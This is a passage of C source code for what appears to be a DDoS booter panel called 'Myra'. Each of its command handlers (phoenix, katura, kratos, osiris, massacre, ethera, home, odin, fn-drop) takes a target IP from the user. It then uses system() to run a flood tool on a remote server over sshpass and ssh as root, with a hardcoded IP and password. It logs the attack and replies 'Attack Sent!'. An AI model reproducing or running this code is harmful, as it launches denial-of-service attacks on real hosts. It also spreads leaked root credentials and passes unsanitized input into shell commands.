      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mPHOENIX\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].phoenix.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./phoenix %s 10 -1 1200 1\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].phoenix.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./phoenix %s 10 -1 1200 1\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mPHOENIX  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200 \r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-PHNX \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".katura") || strstr(myra_buffer_size, ".KATURA")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mKATURA\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].katura.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./katura %s katura.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].katura.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./katura %s katura.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mKATURA   \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200 \r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-KTRA \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".kratos") || strstr(myra_buffer_size, ".KRATOS")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mKRATOS\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].kratos.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./kratos %s kratos.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].kratos.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./kratos %s kratos.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mKRATOS   \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-KRTO \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".osiris") || strstr(myra_buffer_size, ".OSIRIS")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mOSIRIS\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].osiris.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./osiris %s osiris.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].osiris.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./osiris %s osiris.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mOSIRIS   \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ATNA \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".massacre") || strstr(myra_buffer_size, ".MASSACRE")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mMASSACRE\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].massacre.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./massacre %s 8 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].ethera.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./ethera %s ethera.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mMASSACRE \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-MASS \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".ethera") || strstr(myra_buffer_size, ".ETHERA")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mETHERA\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].ethera.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./ethera %s 8 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].ethera.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./ethera %s ethera.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mETHERA   \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ETRA \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".home") || strstr(myra_buffer_size, ".HOME")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].home.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./udphex %s 120\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].home.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./home %s home.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mHOME     \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-HOME \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".odin") || strstr(myra_buffer_size, ".ODIN")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mODIN\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mHOME\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mThreads:\e[38;5;134m[\e[38;5;168m2\e[38;5;134m] \e[38;5;168mPPS:\e[38;5;134m[\e[38;5;168mMAX\e[38;5;134m] \e[38;5;168mTime:\e[38;5;134m[\e[38;5;168m1200\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].odin.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./odin %s odin.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].odin.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./odin %s odin.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mODIN     \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ODIN \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".fn-drop") || strstr(myra_buffer_size, ".FN-DROP")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mFN-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mFN-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -S \"%s.[%s].fn-drop.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@45.143.220.93 ./fn-drop %s fn-drop.txt 40 88\r\n", accounts[find_line].username, iptarget, iptarget);
      //sprintf(ipkill3, "screen -S \"%s.[%s].odin.attack\" -d -m sshpass -p suckyourdad1234@ ssh root@66.36.234.66 ./odin %s odin.txt 10 -1 1200\r\n", accounts[find_line].username, iptarget, iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mFN-DROP  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m88\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-FNDP \x1b[38;5;225m║ \x1b[38;5;168mThrottle\x1b[38;5;225m: \e[38;5;134m5\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".r6-drop") || strstr(myra_buffer_size, ".R6-DROP")) // BT DHT
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
